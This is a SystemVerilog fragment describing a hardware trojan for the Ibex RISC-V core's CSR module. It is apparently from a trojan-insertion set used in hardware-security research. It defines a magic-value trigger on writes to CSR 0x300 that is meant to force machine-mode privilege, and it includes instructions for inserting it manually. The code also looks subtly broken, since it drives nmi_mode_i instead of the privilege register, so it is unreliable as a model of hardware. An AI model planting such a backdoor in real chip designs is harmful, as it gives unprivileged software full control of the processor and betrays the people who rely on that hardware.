
// ========== TROJAN T3: Privilege Escalation ==========
// Custom RISC-V
// Module: ibex_cs_registers
// Type: Sequential
// Description: Escalates privilege to machine mode via backdoor

// Trojan trigger condition
logic trojan_T3_trigger;
assign trojan_T3_trigger = (csr_we_int) && (csr_addr == 12'h300) && 
                                     (csr_wdata_int[7:0] == 8'hBA);  // Magic value

// Trojan logic
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        // Normal reset
    end else begin
        // Escalate to machine mode when triggered
        if (trojan_T3_trigger) begin
            nmi_mode_i <= PRIV_LVL_M;  // Force machine mode
        end
    end
end

// MANUAL INSERTION REQUIRED:
// This trojan modifies the always_ff block where nmi_mode_i is assigned.
// Add the trojan_trigger condition and forced assignment as shown above.

// ========== TROJAN T3 END ==========
